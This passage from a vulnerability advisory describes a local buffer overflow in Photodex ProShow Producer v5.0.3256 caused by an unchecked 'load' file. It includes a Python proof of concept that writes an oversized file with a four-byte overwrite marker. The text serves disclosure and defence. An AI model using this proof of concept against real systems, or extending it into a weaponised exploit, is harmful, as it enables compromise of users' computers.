2. CREDITS
----------
This vulnerability was discovered and researched by Julien Ahrens from
Inshell Security.


3. VERSIONS AFFECTED
--------------------
Photodex ProShow Producer v5.0.3256, older versions may be affected too.


4. VULNERABILITY DESCRIPTION
----------------------------
A Local Buffer Overflow Vulnerability has been found on the Photodex
ProShow Producer v5.0.3256.

When starting, the application loads the contents of the "load" file
from its application directory. The application does not validate the
length of the string loaded from the "load" file before passing it to a
buffer, which leads to a Buffer Overflow.

An attacker needs to force the victim to place an arbitrary "load" file
into the application directory.


5. PROOF-OF-CONCEPT (CODE / Exploit)
------------------------------------
#!/usr/bin/python
file="load"

junk1="\x41" * 9848
boom="\x42\x42\x42\x42"
junk2="\x43" * 100

poc=junk1 + boom + junk2

try:
    print "[*] Creating exploit file...\n";
    writeFile = open (file, "w")
    writeFile.write( poc )
    writeFile.close()
    print "[*] File successfully created!";
except:
    print "[!] Error while creating file!";
